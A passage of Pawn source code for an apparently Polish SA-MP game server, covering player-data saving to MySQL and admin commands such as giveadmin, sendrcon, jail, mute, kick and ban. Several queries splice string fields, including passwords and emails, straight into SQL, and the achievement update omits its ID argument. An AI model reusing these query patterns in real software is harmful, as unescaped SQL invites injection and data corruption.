			mysql_query(sql);
		}
	}
	Loop(playerid, MAX_PLAYERS) { if(IsPlayerConnected(playerid)) SetTimerEx("HideSave", 3000, 0, "i", playerid); }
}

SaveAllData(playerid)
{
    if(!Player[playerid][IsLoggedIn]) return 1;
	TextDrawShowForPlayer(playerid, SV0);
	TextDrawShowForPlayer(playerid, SV1);
	m_query("UPDATE players SET username = '%s', password = '%s', kills = %d, deaths = %d, waluta = %d, x = %.1f, y = %.1f, z = %.1f, angle = %.1f WHERE id = %d", Player[playerid][Name], Player[playerid][Password], Player[playerid][Kills], Player[playerid][Deaths], Player[playerid][Cash], Player[playerid][X_Pos], Player[playerid][Y_Pos], Player[playerid][Z_Pos], Player[playerid][A_Pos], Player[playerid][ID]);
	m_query("UPDATE players SET interior = %d, rank = %d, mutetime = %d, warny = %d, skin = %d, exp = %d, level = %d, vcash = %d, hours = %d, minutes = %d WHERE id = %d", Player[playerid][Interior], Player[playerid][Admin], Player[playerid][MuteTime], Player[playerid][Warny], Player[playerid][Skin], Player[playerid][Exp], Player[playerid][Level], Player[playerid][vCash], Player[playerid][Hours], Player[playerid][Minutes], Player[playerid][ID]);
	m_query("UPDATE players SET item1 = %d, item1n = '%s', item2 = %d, item2n = '%s', item3 = %d, item3n = '%s', item4 = %d, item4n = '%s', item5 = %d WHERE id = %d", Player[playerid][ItemAmount1], Player[playerid][ItemName1], Player[playerid][ItemAmount2], Player[playerid][ItemName2], Player[playerid][ItemAmount3], Player[playerid][ItemName3], Player[playerid][ItemAmount4], Player[playerid][ItemName4], Player[playerid][ItemAmount5], Player[playerid][ID]);
	m_query("UPDATE players SET item5n = '%s', item6 = %d, item6n = '%s', item7 = %d, item7n = '%s', item8 = %d, item8n = '%s', gang = %d, house = %d, r1 = %d, r2 = %d, r3 = %d, r4 = %d, r5 = %d, r6 = %d, r7 = %d, nicktime = %d, vip = %d, sounds = %d, realtime = %d, hitman = %d WHERE id = %d", Player[playerid][ItemName5], Player[playerid][ItemAmount6], Player[playerid][ItemName6], Player[playerid][ItemAmount7], Player[playerid][ItemName7], Player[playerid][ItemAmount8],
		Player[playerid][ItemName8], Player[playerid][Gang], Player[playerid][House], Player[playerid][r1], Player[playerid][r2], Player[playerid][r3], Player[playerid][r4], Player[playerid][r5], Player[playerid][r6], Player[playerid][r7], Player[playerid][NickChange], Player[playerid][Vip], Player[playerid][HasSounds], Player[playerid][HasRealTime], Player[playerid][Hitman], Player[playerid][ID]);
	m_query("UPDATE players SET a1 = %d, a2 = %d, a3 = %d, a4 = %d, a5 = %d, a6 = %d, a7 = %d, a8 = %d, czat = %d, solo = %d, potwory = %d, zabawy = %d, visits = %d, cbug = %0.4f, questy = %d, jail = %d WHERE id = %d", Player[playerid][A1], Player[playerid][A2], Player[playerid][A3], Player[playerid][A4],
		Player[playerid][A5], Player[playerid][A6], Player[playerid][A7], Player[playerid][A8], Player[playerid][Czat], Player[playerid][Solo], Player[playerid][Potwory], Player[playerid][Zabawyp], Player[playerid][Wizyty], Player[playerid][GL], Player[playerid][Questy], JailTimeP[playerid], Player[playerid][ID]);
	m_query("UPDATE players SET bonus = %d, bank = %d, email = '%s', cpick = %d, bankc = %d, rud = %d, discord = '%s', gong = %d, auth = '%s' WHERE id = %d", Player[playerid][Bonus], Player[playerid][Bank], Player[playerid][Email], Player[playerid][CPick], Player[playerid][BankC], Player[playerid][Rud], DiscordUser[playerid], Player[playerid][Gang], Player[playerid][Auth], Player[playerid][ID]);
	Loop(skinid, MAX_SKINS) {
	    new newid = skinid + 1;
	    m_query("UPDATE players SET s%d = %d WHERE id = %d", newid, sk[playerid][skinid], Player[playerid][ID]); }
	Loop(ach, 22) m_query("UPDATE players SET ac%d = %d WHERE id = %d", ach, pAch[playerid][ach]);
	Loop(loopid, MAX_PLAYERS) { if(IsPlayerConnected(loopid)) SetTimerEx("HideSave", 3000, 0, "i", loopid); }
	return 1;
}

UpdatePlayerDeaths(playerid)
{
	if (Player[playerid][IsLoggedIn] == false) return 0;
	Player[playerid][Deaths]++;
	return 1;
}

UpdatePlayerKills(killerid)
{
	if (killerid == INVALID_PLAYER_ID) return 0;
	if (Player[killerid][IsLoggedIn] == false) return 0;
 	Player[killerid][Kills]++;
	return 1;
}

CMD:smp(playerid, params[]) return cmd_savemypos(playerid, params);
CMD:savemypos(playerid, params[]) {
	GetPlayerPos(playerid, SavedX[playerid], SavedY[playerid], SavedZ[playerid]);
	return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Pozycja zapisana. U¿yj "C_WHITE"/loadmypos"C_LOLIVE", aby j¹ wczytaæ."); }

CMD:lmp(playerid, params[]) return cmd_loadmypos(playerid, params);
CMD:loadmypos(playerid, params[])
{
	if(SavedX[playerid] == -1) return DialogError(playerid, "{FFFF00}Nie posiadasz zapisanej ¿adnej pozycji.");
	return TPPlayer(playerid, 0, SavedX[playerid], SavedY[playerid], SavedZ[playerid]);
}

//-----------------------------------------------------

CMD:loadpos(playerid, params[]) {
	if(SavedAdminX == -1) return DialogError(playerid, "{FFFF00}Ostatnio nie zosta³a zapisana ¿adna pozycja.");
	return TPPlayer(playerid, 0, SavedAdminX, SavedAdminY, SavedAdminZ); }

CMD:savepos(playerid, params[]) {
	if(Player[playerid][Admin] < 2) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "ADMIN""C_RED" lub wy¿szej.");
	GetPlayerPos(playerid, SavedAdminX, SavedAdminY, SavedAdminZ);
	return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Pozycja zapisana. Gracze mog¹ teraz u¿ywaæ "C_WHITE"/loadpos"C_LOLIVE", aby j¹ wczytaæ."); }

CMD:giveadmin(playerid, params[]) 
{
	if(Player[playerid][Admin] != 4) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "HA""C_RED".");
	new giveid, level;
	if(sscanf(params,"ii",giveid,level)) return SendClientMessage(playerid, -1, "/giveadmin [playerid] [poziom (0,1-EV,2-A,3-VHA,4-HA)]");
	if(level < 0 || level > 4) return SyntaxError(playerid, "{01FCFF}/giveadmin [playerid] [poziom (0,1-EV,2-A,3-VHA,4-HA)]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(level == 0)
	{
	    admins--;
	    new msgs[256];
	    format(msgs, sizeof(msgs), "Zabra³eœ uprawnienia graczowi "C_WHITE"%s"C_RED".", Player[giveid][Name]);
 		SendClientMessage(playerid, RED, msgs);
	    format(msgs, sizeof(msgs), "%s "C_RED"zabra³ Ci uprawnienia.", Player[playerid][Name]);
 		SendClientMessage(giveid, WHITE, msgs);
		Player[giveid][Admin] = 0;
	}
	if(level == 1)
	{
	    if(Player[giveid][Admin] < 1) admins++;
	    new msgs[256];
	    format(msgs, sizeof(msgs), "Nada³eœ graczowi "C_WHITE"%s "C_RED"rangê "JUNIOR""C_RED".", Player[giveid][Name]);
 		SendClientMessage(playerid, RED, msgs);
	    format(msgs, sizeof(msgs), "%s "C_RED"nada³ Ci rangê "JUNIOR""C_RED".", Player[playerid][Name]);
 		SendClientMessage(giveid, WHITE, msgs);
		Player[giveid][Admin] = 1;
	}
	if(level == 2)
	{
	    if(Player[giveid][Admin] < 1) admins++;
	    new msgs[256];
	    format(msgs, sizeof(msgs), "Nada³eœ graczowi "C_WHITE"%s "C_RED"rangê "ADMIN""C_RED".", Player[giveid][Name]);
 		SendClientMessage(playerid, RED, msgs);
	    format(msgs, sizeof(msgs), "%s "C_RED"nada³ Ci rangê "ADMIN""C_RED".", Player[playerid][Name]);
 		SendClientMessage(giveid, WHITE, msgs);
		Player[giveid][Admin] = 2;
	}
	if(level == 3)
	{
	    if(Player[giveid][Admin] < 1) admins++;
	    new msgs[256];
	    format(msgs, sizeof(msgs), "Nada³eœ graczowi "C_WHITE"%s "C_RED"rangê "VHA""C_RED".", Player[giveid][Name]);
 		SendClientMessage(playerid, RED, msgs);
	    format(msgs, sizeof(msgs), "%s "C_RED"nada³ Ci rangê "VHA""C_RED".", Player[playerid][Name]);
 		SendClientMessage(giveid, WHITE, msgs);
		Player[giveid][Admin] = 3;
	}
	if(level == 4)
	{
	    if(Player[giveid][Admin] < 1) admins++;
	    new msgs[256];
	    format(msgs, sizeof(msgs), "Nada³eœ graczowi "C_WHITE"%s "C_RED"rangê "HA""C_RED".", Player[giveid][Name]);
 		SendClientMessage(playerid, RED, msgs);
	    format(msgs, sizeof(msgs), "%s "C_RED"nada³ Ci rangê "HA""C_RED".", Player[playerid][Name]);
 		SendClientMessage(giveid, WHITE, msgs);
		Player[giveid][Admin] = 4;
	}
	return 1;
}

CMD:sendrcon(playerid, params[]) 
{
	if(Player[playerid][Admin] != 4) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "HA""C_RED".");
	if(isnull(params)) return SyntaxError(playerid, "{01FCFF}/sendrcon [params]");
	if(CompareEx(params,"gmx"))
	{
		new restartstr[256];
		format(restartstr, sizeof(restartstr), ""PYTAJNIK""C_NICK"%s(%d) "C_ORANGE"wymusi³ restart GM.", Player[playerid][Name], playerid);
	    SendClientMessageToAll(-1, restartstr);
		SavePrivcars();
		Loop(loopid, MAX_PLAYERS) {
		    if(IsPlayerConnected(loopid)) SaveAllData(loopid); }
	}
	return SendRconCommand(params);
}

CMD:cd(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
 	new time;
	if(sscanf(params,"i",time)) return SyntaxError(playerid, "{01FCFF}/cd [czas w sekundach]");
	if(time > 60 || time < 4) return SendClientMessage(playerid, RED, "Nieprawid³owy czas.");
    new msgs[256];
	format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"rozpocz¹³ globalne odliczanie z czasem "C_WHITE"%d "C_RED"sekund.", Player[playerid][Name], playerid, time);
 	SendClientMessageToAll(WHITE, msgs);
	Loop(loopid, MAX_PLAYERS) Countdown[loopid] = time;
	return 1;
}

CMD:jail(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new giveid, mutetime, reason[48];
	if(sscanf(params,"iis[48]",giveid,mutetime,reason)) return SyntaxError(playerid, "{01FCFF}/jail [playerid] [czas w sekundach] [powód]");
	if(mutetime < 3) return SyntaxError(playerid, "{01FCFF}/jail [playerid] [czas w sekundach] [powód]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(Player[giveid][Admin] > Player[playerid][Admin]) return SendClientMessage(playerid, RED, "Podany gracz posiada rangê wy¿sz¹ od Ciebie.");
	if(JailTimeP[giveid] > 0) return SendClientMessage(playerid, RED, "Podany gracz jest ju¿ w wiêzieniu.");
	new nickstr[256];
	format(nickstr, sizeof(nickstr), "%s(%d)", Player[playerid][Name], playerid);
	return JailPlayer(nickstr, giveid, reason, mutetime);
}

CMD:unjail(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new giveid;
	if(sscanf(params,"i",giveid)) return SyntaxError(playerid, "{01FCFF}/unjail [playerid]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(JailTimeP[giveid] < 1) return SendClientMessage(playerid, RED, "Podany gracz nie jest w wiêzieniu.");
	JailTimeP[giveid] = 2;
    new msgs[256];
	format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wypuœci³ gracza "C_NICK"%s(%d) "C_RED"z wiêzienia.", Player[playerid][Name], playerid, Player[giveid][Name], giveid);
 	return SendClientMessageToAll(WHITE, msgs);
}

CMD:walizka(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new podpo[48];
	if(sscanf(params,"s[24]",podpo)) return SyntaxError(playerid, "{01FCFF}/walizka [podpowiedŸ]");
	if(strlen(params) < 3 || strlen(params) > 24) return SyntaxError(playerid, "{01FCFF}Zbyt d³uga lub zbyt krótka podpowiedŸ.");
	if(ZnajdzkaActive) return SendClientMessage(playerid, RED, "Jakaœ znajdŸka jest ju¿ na mapie.");

	Loop(i, MAX_PLAYERS) SetPlayerMarkerForPlayer(i, playerid, 0xFFFFFF00);
	SetTimerEx("UnHide", 7000, 0, "i", playerid);

    new msgs[256], tdstr[256];
	format(msgs, sizeof(msgs), ""C_NICK"%s(%d) {62F442}ukry³ walizkê. PodpowiedŸ: "C_WHITE"%s", Player[playerid][Name], playerid, podpo);
	format(tdstr, sizeof(tdstr), "> ~r~~h~Walizka ~g~~h~na mapie! ~w~~h~(%s)", podpo);
	TextDrawSetString(Textdraw[27], tdstr);
	Loop(loopid, MAX_PLAYERS) { if(IsPlayerConnected(loopid) && TDOn[loopid]) TextDrawShowForPlayer(loopid, Textdraw[27]); }
 	SendClientMessageToAll(WHITE, msgs);
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	ZnajdzkaActive = true;
	ZnajdzkaType = 1;
	WalizkaPickup = CreateDynamicPickup(1210, 1, x, y, z, 0, GetPlayerInterior(playerid));
	return 1;
}

CMD:figurka(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new podpo[48];
	if(sscanf(params,"s[24]",podpo)) return SyntaxError(playerid, "{01FCFF}/figurka [podpowiedŸ]");
	if(strlen(params) < 3 || strlen(params) > 24) return SyntaxError(playerid, "{01FCFF}Zbyt d³uga lub zbyt krótka podpowiedŸ.");
	if(ZnajdzkaActive) return SendClientMessage(playerid, RED, "Jakaœ znajdŸka jest ju¿ na mapie.");

	Loop(i, MAX_PLAYERS) SetPlayerMarkerForPlayer(i, playerid, 0xFFFFFF00);
	SetTimerEx("UnHide", 7000, 0, "i", playerid);

    new msgs[256], tdstr[256];
	format(msgs, sizeof(msgs), ""C_NICK"%s(%d) {F493FF}ukry³ figurkê. PodpowiedŸ: "C_WHITE"%s", Player[playerid][Name], playerid, podpo);
	format(tdstr, sizeof(tdstr), "> ~g~~h~Figurka ~g~~h~na mapie! ~w~~h~(%s)", podpo);
	TextDrawSetString(Textdraw[27], tdstr);
	Loop(loopid, MAX_PLAYERS) { if(IsPlayerConnected(loopid) && TDOn[loopid]) TextDrawShowForPlayer(loopid, Textdraw[27]); }
 	SendClientMessageToAll(WHITE, msgs);
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	ZnajdzkaActive = true;
	ZnajdzkaType = 2;
	FigurkaPickup = CreateDynamicPickup(1276, 1, x, y, z, 0, GetPlayerInterior(playerid));
	return 1;
}

CMD:bomba(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new podpo[48];
	if(sscanf(params,"s[24]",podpo)) return SyntaxError(playerid, "{01FCFF}/bomba [podpowiedŸ]");
	if(strlen(params) < 3 || strlen(params) > 24) return SyntaxError(playerid, "{01FCFF}Zbyt d³uga lub zbyt krótka podpowiedŸ.");
	if(ZnajdzkaActive) return SendClientMessage(playerid, RED, "Jakaœ znajdŸka jest ju¿ na mapie.");
	new tdstr[256];
	format(tdstr, sizeof(tdstr), "> ~r~~h~Bomba ~g~~h~na mapie! ~w~~h~(%s)", podpo);
	TextDrawSetString(Textdraw[27], tdstr);
	Loop(loopid, MAX_PLAYERS) { if(IsPlayerConnected(loopid) && TDOn[loopid]) TextDrawShowForPlayer(loopid, Textdraw[27]); }
	Loop(i, MAX_PLAYERS) SetPlayerMarkerForPlayer(i, playerid, 0xFFFFFF00);
	SetTimerEx("UnHide", 7000, 0, "i", playerid);

    new msgs[256];
	format(msgs, sizeof(msgs), ""C_NICK"%s(%d) {ff6b6b}pod³o¿y³ bombê. PodpowiedŸ: "C_WHITE"%s", Player[playerid][Name], playerid, podpo);
 	SendClientMessageToAll(WHITE, msgs);
 	SendClientMessageToAll(WHITE, "{ff6b6b}Bomba wybuchnie automatycznie po "C_WHITE"5 {ff6b6b}minutach.");
	GetPlayerPos(playerid, BombaPos[0], BombaPos[1], BombaPos[2]);
	ZnajdzkaActive = true;
	ZnajdzkaType = 3;
	BombaPickup = CreateDynamicPickup(1252, 1, BombaPos[0], BombaPos[1], BombaPos[2], 0, GetPlayerInterior(playerid));
	BombaTimer = SetTimer("BombaDestroy", 1000*300, 0);
	return 1;
}

CMD:delwalizka(playerid, params[])
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
    if(ZnajdzkaType != 1) return SendClientMessage(playerid, RED, "Walizki nie ma na mapie.");
    DestroyDynamicPickup(WalizkaPickup);
    ZnajdzkaType = -1;
    ZnajdzkaActive = false;
 	Loop(loopid, MAX_PLAYERS) { if(TDOn[loopid] && IsPlayerConnected(loopid)) TextDrawHideForPlayer(loopid, Textdraw[27]); }
    return 1;
}

CMD:delfigurka(playerid, params[])
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
    if(ZnajdzkaType != 2) return SendClientMessage(playerid, RED, "Figurki nie ma na mapie.");
    DestroyDynamicPickup(FigurkaPickup);
    ZnajdzkaType = -1;
    ZnajdzkaActive = false;
 	Loop(loopid, MAX_PLAYERS) { if(TDOn[loopid] && IsPlayerConnected(loopid)) TextDrawHideForPlayer(loopid, Textdraw[27]); }
    return 1;
}

CMD:delbomba(playerid, params[])
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
    if(ZnajdzkaType != 3) return SendClientMessage(playerid, RED, "Bomby nie ma na mapie.");
    ZnajdzkaType = -1;
    ZnajdzkaActive = false;
 	Loop(loopid, MAX_PLAYERS) { if(TDOn[loopid] && IsPlayerConnected(loopid)) TextDrawHideForPlayer(loopid, Textdraw[27]); }
    return 1;
}

forward BombaDestroy();
public BombaDestroy() {
	ZnajdzkaType = -1;
	ZnajdzkaActive = false;
	CreateExplosion(BombaPos[0], BombaPos[1], BombaPos[2], 11, 10);
	DestroyDynamicPickup(BombaPickup);
 	Loop(loopid, MAX_PLAYERS) { if(TDOn[loopid] && IsPlayerConnected(loopid)) TextDrawHideForPlayer(loopid, Textdraw[27]); }
	KillTimer(BombaTimer); }

CMD:mute(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new giveid, mutetime, reason[128];
	if(sscanf(params,"iis[128]",giveid,mutetime,reason)) return SyntaxError(playerid, "{01FCFF}/mute [playerid] [czas w minutach] [powód]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(mutetime > 720 || mutetime < 1) return SendClientMessage(playerid, RED, "Nieprawid³owy czas uciszenia.");
    new msgs[256];
	format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"uciszony przez "C_NICK"%s(%d) "C_RED"("C_WHITE"%dm, %s"C_RED")", Player[giveid][Name], giveid, Player[playerid][Name], playerid, mutetime, reason);
 	SendClientMessageToAll(WHITE, msgs);
	Player[giveid][MuteTime] = gettime() + 60 * mutetime;
	return 1;
}

CMD:disarmp(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new giveid;
	if(sscanf(params,"i",giveid)) return SyntaxError(playerid, "{01FCFF}/disarmp [playerid]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
    new msgs[256];
	format(msgs, sizeof(msgs), "Admin "C_NICK"%s(%d) "C_RED"rozbroi³ Ciê.", Player[playerid][Name], playerid);
 	SendClientMessage(giveid, RED, msgs);
	ResetPlayerWeapons(giveid);
	return 1;
}

CMD:killp(playerid, params[]) 
{
    if(Player[playerid][Admin] < 2) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "ADMIN""C_RED" lub wy¿szej.");
	new giveid;
	if(sscanf(params,"i",giveid)) return SyntaxError(playerid, "{01FCFF}/killp [playerid]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	Suicided[giveid] = true;
    new msgs[256];
	format(msgs, sizeof(msgs), "Admin "C_NICK"%s(%d) "C_RED"zabi³ Ciê.", Player[playerid][Name], playerid);
 	SendClientMessage(giveid, RED, msgs);
	SetPlayerHealth(giveid, 0.0);
	return 1;
}

CMD:wypisz(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new giveid;
	if(sscanf(params,"i",giveid)) return SyntaxError(playerid, "{01FCFF}/wypisz [playerid]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
    new msgs[256];
	format(msgs, sizeof(msgs), "Admin "C_NICK"%s(%d) "C_RED"wypisa³ Ciê z zabaw.", Player[playerid][Name], playerid);
 	SendClientMessage(giveid, RED, msgs);
	return WypiszZabawa(giveid);
}

CMD:freeze(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new giveid;
	if(sscanf(params,"i",giveid)) return SyntaxError(playerid, "{01FCFF}/freeze [playerid]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
    new msgs[256];
    Freezed[giveid] = true;
	format(msgs, sizeof(msgs), "Admin "C_NICK"%s(%d) "C_RED"zamrozi³ Ciê.", Player[playerid][Name], playerid);
 	SendClientMessage(giveid, RED, msgs);
	TogglePlayerControllable(giveid, 0);
	return 1;
}

CMD:unfreeze(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new giveid;
	if(sscanf(params,"i",giveid)) return SyntaxError(playerid, "{01FCFF}/unfreeze [playerid]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
    new msgs[256];
    Freezed[giveid] = false;
	format(msgs, sizeof(msgs), "Admin "C_NICK"%s(%d) "C_RED"odmrozi³ Ciê.", Player[playerid][Name], playerid);
 	SendClientMessage(giveid, RED, msgs);
	TogglePlayerControllable(giveid, 1);
	return 1;
}

CMD:unmute(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new giveid;
	if(sscanf(params,"i",giveid)) return SyntaxError(playerid, "{01FCFF}/unmute [playerid]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(gettime() > Player[giveid][MuteTime]) return SendClientMessage(playerid, RED, "Gracz nie jest uciszony.");
    new msgs[256];
	format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"odciszony przez "C_NICK"%s(%d)"C_RED".", Player[giveid][Name], giveid, Player[playerid][Name], playerid);
 	SendClientMessageToAll(WHITE, msgs);
	Player[giveid][MuteTime] = -1;
	return 1;
}

CMD:respawn(playerid, params[])
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
    new resp[256];
    format(resp, sizeof(resp), "*  "C_NICK"%s(%d) {FFF3A5}wymusi³ respawn pojazdów.", Player[playerid][Name], playerid);
    SendClientMessageToAll(-1, resp);
	Loop(vehicleid, MAX_SVEHICLES)
 	{
  		new liczba;
   		Loop(loopid, MAX_PLAYERS) { if(IsPlayerInVehicle(loopid, sVehicle[vehicleid])) liczba++; }
	   	if(liczba == 0)
	   	{
		   	SetVehiclePos(sVehicle[vehicleid], sX[vehicleid], sY[vehicleid], sZ[vehicleid]);
			SetVehicleZAngle(sVehicle[vehicleid], sA[vehicleid]);
			RepairVehicle(sVehicle[vehicleid]);
	    }
	}
	new ppp;
   	Loop(privcarid, MAX_PRIVCARS)
    {
		Loop(loopid, MAX_PLAYERS) {
			if(IsPlayerInVehicle(loopid, ppVeh[privcarid])) ppp++; }
   	   	if(ppp < 1)
	   	{
			SetVehiclePos(ppVeh[privcarid], prX[privcarid], prY[privcarid], prZ[privcarid]);
			SetVehicleZAngle(ppVeh[privcarid], prA[privcarid]);
	   	}
	}
	new pv[MAX_PLAYERS];
	Loop(loopid, MAX_PLAYERS)
	{
	    pv[loopid] = 0;
	    if(IsPlayerInVehicle(loopid, pVeh[loopid])) pv[loopid]++;
	    if(pv[loopid] < 1 && vSpawned[loopid]) {
			DestroyVehicle(pVeh[loopid]);
			vSpawned[loopid] = false; }
	}
	return 1;
}

CMD:ann(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new time, text[128];
	if(sscanf(params,"is[128]",time, text)) return SyntaxError(playerid, "{01FCFF}/ann [czas (6-15s)] [text]");
	if(time < 6 || time > 15) return SyntaxError(playerid, "{01FCFF}/ann [czas (6-15s)] [text]");
   	new msgs[256];
	format(msgs, sizeof(msgs), "~r~~h~%s~n~~w~~h~%s", Player[playerid][Name], text);
 	TextDrawSetString(Ann, msgs);
	TextDrawShowForAll(Ann);
	AnnTimer = time;
	new msg[256];
	format(msg, sizeof(msg), "[ann] %s: %s", Player[playerid][Name], text);
	DCC_SendChannelMessage(samp_chat, msg);
	return 1;
}

CMD:kick(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new giveid, reason[128];
	if(sscanf(params,"is[128]",giveid,reason)) return SyntaxError(playerid, "{01FCFF}/kick [playerid] [powód]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(Player[giveid][Admin] > Player[playerid][Admin]) return SendClientMessage(playerid, RED, "Podany gracz posiada rangê wy¿sz¹ od Ciebie.");
   	new msgs[256];
	format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony przez "C_NICK"%s(%d) "C_WHITE"(%s)", Player[giveid][Name], giveid, Player[playerid][Name], playerid, reason);
 	SendClientMessageToAll(WHITE, msgs);
	DelayedKick(giveid);
	kicks++;
	return 1;
}

CMD:vote(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	if(VoteTrwa) return SendClientMessage(playerid, RED, "G³osowanie ju¿ trwa.");
	return ShowPlayerDialog(playerid, DIALOG_VOTE, DIALOG_STYLE_INPUT, ""NAZWA" {1194D6}» "C_WHITE"G³osowanie", ""C_YELLOW"Wpisz treœæ pytania", "Zadaj", "Zamknij");
}

CMD:tak(playerid, params[]) 
{
	if(!VoteTrwa) return SendClientMessage(playerid, RED, "G³osowanie nie trwa.");
	if(VoteGlosowal[playerid]) return SendClientMessage(playerid, RED, "Odda³eœ ju¿ swój g³os.");
	VoteGlosowal[playerid] = true;
	VoteTak++;
	return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Odda³eœ/aœ swój g³os.");
}

CMD:nie(playerid, params[]) 
{
	if(!VoteTrwa) return SendClientMessage(playerid, RED, "G³osowanie nie trwa.");
	if(VoteGlosowal[playerid]) return SendClientMessage(playerid, RED, "Odda³eœ ju¿ swój g³os.");
	VoteGlosowal[playerid] = true;
	VoteNie++;
	return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Odda³eœ/aœ swój g³os.");
}

CMD:sevent(playerid, params[]) {
    if(Player[playerid][Admin] < 2) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "ADMIN""C_RED" lub wy¿szej.");
	if(ServerEvent) return SendClientMessage(playerid, RED, "Event serwera jest w trakcie trwania.");
	LosujNowyEvent();
	return 1; }

CMD:ban(playerid, params[]) 
{
    if(SQLInjection(params))
    {
		if(pAch[playerid][1] < 1) {
			pAch[playerid][1] = 1;
			AddExp(playerid, 200);
			Sound(playerid,1137,0.0,0.0,0.0);
			SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Haker", "New achievement: "C_NICK"Haker"); }
		return 1;
    }
    if(Player[playerid][Admin] < 2) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "ADMIN""C_RED" lub wy¿szej.");
	new giveid, type, reason[32];
	if(sscanf(params,"iis[32]",giveid,type,reason)) return SyntaxError(playerid, "{01FCFF}/ban [playerid] [czas (0=permban)] [powód]");
	if(!IsPlayerConnected(giveid) || !Player[giveid][IsLoggedIn]) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(Player[giveid][Admin] > Player[playerid][Admin]) return SendClientMessage(playerid, RED, "Podany gracz posiada rangê wy¿sz¹ od Ciebie.");
	if(strlen(reason) > 32) return SendClientMessage(playerid, RED, "Nieprawid³owa d³ugoœæ powodu bana.");
